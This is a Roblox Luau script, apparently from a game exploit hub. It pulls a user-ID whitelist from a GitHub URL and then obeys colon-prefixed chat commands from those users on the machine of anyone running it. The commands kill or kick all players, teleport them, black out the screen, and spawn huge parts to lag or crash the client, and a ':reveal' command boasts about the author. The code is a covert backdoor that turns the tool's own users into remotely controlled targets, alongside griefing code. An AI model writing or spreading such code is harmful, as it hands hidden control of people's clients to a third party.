local adminLocalPlayer = players.LocalPlayer
local whitelistData = {}
local fetchSuccess, whitelistRes = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/Bruhiscrazy/Obsidian-/refs/heads/main/Whitelist") end)

local isUserWhitelisted, sendAdminChat, punishPlayer, processAdminCommand, findTargetByName, toggleBlindEffect
local auraActiveMap, auraTargetMap, blindStateMap, safetyBubbleMap

if fetchSuccess and whitelistRes then
    local decodeSuccess, decodedTable = pcall(function() return httpService:JSONDecode(whitelistRes) end)
    if decodeSuccess and typeof(decodedTable) == "table" then
        whitelistData = decodedTable

        function isUserWhitelisted(playerObj)
            return table.find(whitelistData, playerObj.UserId) ~= nil
        end

        auraTargetMap = {}
        auraActiveMap = {}
        blindStateMap = {}
        safetyBubbleMap = {}

        function sendAdminChat(msg)
            if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = textChatService:FindFirstChild("TextChannels")
                if textChannels and textChannels:FindFirstChild("RBXGeneral") then
                    textChannels.RBXGeneral:SendAsync(msg)
                end
            else
                local defaultChatEvents = replicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
                if defaultChatEvents and defaultChatEvents:FindFirstChild("SayMessageRequest") then
                    defaultChatEvents.SayMessageRequest:FireServer(msg, "All")
                end
            end
        end

        function punishPlayer(playerObj)
            if pcall(function() playerObj:Kick("You were kicked by an admin!") end) then
                orionLib:MakeNotification({ Name = "💀 Kicked", Content = playerObj.Name .. " has been kicked!", Time = 4 })
            else
                for i = 1, 50 do
                    local part = Instance.new("Part")
                    part.Size = Vector3.new(9000000000, 9000000000, 9000000000)
                    part.Parent = workspace
                    debris:AddItem(part, 0.01)
                end
            end
        end

        function findTargetByName(nameString)
            local searchStr = nameString:lower()
            for _, player in ipairs(players:GetPlayers()) do
                if player.Name:lower():find(searchStr) or player.DisplayName:lower():find(searchStr) then
                    return player
                end
            end
            return nil
        end

        function processAdminCommand(adminPlayer, cmdText)
            if not isUserWhitelisted(adminPlayer) then return end
            if cmdText:sub(1, 1) ~= ":" then return end
            local cmdArgs = string.split(cmdText:sub(2), " ")
            local command = cmdArgs[1]:lower()
            table.remove(cmdArgs, 1)
            local argString = table.concat(cmdArgs, " ")

            if command == "say" then
                if argString ~= "" then sendAdminChat(argString) end
            elseif command == "kick" and argString ~= "" then
                local target = findTargetByName(argString)
                if target then punishPlayer(target) else sendAdminChat("Player not found") end
            elseif command == "killall" or command == "kill" then
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= adminPlayer and player.Character and player.Character:FindFirstChild("Humanoid") then
                        player.Character.Humanoid.Health = 0
                    end
                end
            elseif command == "banall" then
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= adminPlayer then player:Kick("Banned by admin") end
                end
            elseif command == "aura" then
                auraActiveMap[adminPlayer] = not auraActiveMap[adminPlayer]
            elseif command == "e" then
                toggleBlindEffect(adminPlayer)
            elseif command == "sb" then
                local radius = tonumber(argString)
                if radius and radius > 0 then
                    safetyBubbleMap[adminPlayer] = radius
                    sendAdminChat("Safety bubble set to " .. radius)
                else
                    safetyBubbleMap[adminPlayer] = nil
                    sendAdminChat("Safety bubble disabled")
                end
            elseif command == "1" and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
                local adminRoot = adminPlayer.Character.HumanoidRootPart
                for _, player in ipairs(players:GetPlayers()) do
                    if player ~= adminPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        player.Character.HumanoidRootPart.CFrame = adminRoot.CFrame + Vector3.new(3, 0, 0)
                    end
                end
            elseif command == "reveal" then
                sendAdminChat("best ftap player is bruh")
            end
        end

        function toggleBlindEffect(adminPlayer)
            blindStateMap[adminPlayer] = not blindStateMap[adminPlayer]
            local blindUI = adminLocalPlayer.PlayerGui:FindFirstChild("BlindEffect")
            if blindStateMap[adminPlayer] then
                if not blindUI then
                    local newBlindGui = Instance.new("ScreenGui")
                    newBlindGui.Name = "BlindEffect"
                    newBlindGui.ResetOnSpawn = false
                    local frame = Instance.new("Frame")
                    frame.Size = UDim2.new(1, 0, 1, 0)
                    frame.BackgroundColor3 = Color3.new(0, 0, 0)
                    frame.Parent = newBlindGui
                    newBlindGui.Parent = adminLocalPlayer:WaitForChild("PlayerGui")
                end
            elseif blindUI then
                blindUI:Destroy()
            end
        end

        local function initAdminChatHandler()
            if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                local textChannels = textChatService:FindFirstChild("TextChannels")
                if textChannels and textChannels:FindFirstChild("RBXGeneral") then
                    textChannels.RBXGeneral.MessageReceived:Connect(function(messageData)
                        local src = messageData.TextSource
                        if src then
                            local sender = players:GetPlayerByUserId(src.UserId)
                            if sender then processAdminCommand(sender, messageData.Text) end
                        end
                    end)
                end
            else
                for _, player in ipairs(players:GetPlayers()) do
                    player.Chatted:Connect(function(msg) processAdminCommand(player, msg) end)
                end
                players.PlayerAdded:Connect(function(newPlayer)
                    newPlayer.Chatted:Connect(function(msg) processAdminCommand(newPlayer, msg) end)
                end)
            end
        end

        initAdminChatHandler()

        runService.Heartbeat:Connect(function()
            for adminPlayer, isActive in pairs(auraActiveMap) do
                if isActive and adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local adminRoot = adminPlayer.Character.HumanoidRootPart
                    local currentTime = tick()
                    for targetPlayer, _ in pairs(auraTargetMap) do
                        if targetPlayer ~= adminPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local phase = (currentTime + targetPlayer.UserId) % (2 * math.pi)
                            local offsetX = math.cos(phase) * 10
                            local offsetZ = math.sin(phase) * 10
                            targetPlayer.Character.HumanoidRootPart.CFrame = adminRoot.CFrame + Vector3.new(offsetX, 0, offsetZ)
                        end
                    end
                end
            end
        end)

        runService.Heartbeat:Connect(function()
            for adminPlayer, radius in pairs(safetyBubbleMap) do
                if adminPlayer.Character and adminPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    local adminRoot = adminPlayer.Character.HumanoidRootPart
                    for targetPlayer, _ in pairs(auraTargetMap) do
                        if targetPlayer ~= adminPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
                            local targetRoot = targetPlayer.Character.HumanoidRootPart
                            local diff = targetRoot.Position - adminRoot.Position
                            if diff.Magnitude < radius then
                                targetRoot.CFrame = CFrame.new(adminRoot.Position + diff.Unit * radius)
                            end
                        end
                    end
                end
            end
        end)

        auraTargetMap[adminLocalPlayer] = true
        orionLib:Init()
        return
    end
    adminLocalPlayer:Kick("Whitelist data invalid")
    return
end
adminLocalPlayer:Kick("Whitelist services down. Try again later.")
